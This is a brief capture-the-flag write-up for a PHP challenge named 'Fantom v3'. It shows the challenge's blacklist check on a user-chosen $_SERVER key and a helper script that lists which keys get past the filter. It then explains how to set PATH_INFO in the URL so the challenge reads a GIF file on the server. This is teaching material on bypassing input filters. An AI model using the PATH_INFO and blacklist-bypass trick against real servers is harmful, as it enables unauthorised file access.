# Fantom v3

```

<?php
error_reporting(0);

if (isset($_POST['post'])) {
  $post = substr($_POST['post'], 0, 14);
  if(stripos($post, 'php') === false)
  if(stripos($post, 'http') === false)
  if(stripos($post, 'query') === false)
  if(stripos($post, 'server') === false)
  if(stripos($post, 'request') === false)
  if($r = file_get_contents($_SERVER{$post}, NULL, NULL, 0, 4))
  if($r === 'GIF8') echo $solution;
}

?>
```

By filtering out every prefix with an apache setup
```
<?php

header("Content-type: text/plain");

var_dump($_POST);

foreach($_SERVER as $k => $v) {
  $post = $k;
  if(stripos($post, 'php') === false)
  if(stripos($post, 'http') === false)
  if(stripos($post, 'query') === false)
  if(stripos($post, 'server') === false)
  if(stripos($post, 'request') === false)
	echo "$k -->  $v \n";
}
```

It only remains the `CONTENT_TYPE` and `PATH_INFO` as a potential field.

`CONTENT_TYPE` only can be ...multiparth or ...form urlencoded

`PATH_INFO` can be controlled by put a '/' after the .php so, you need to call
https://www.secxrxtytrxps.pl/challs/fantomv3/index.php/usr/share/apache2/icons/text.gif

and post `post=PATH_INFO`
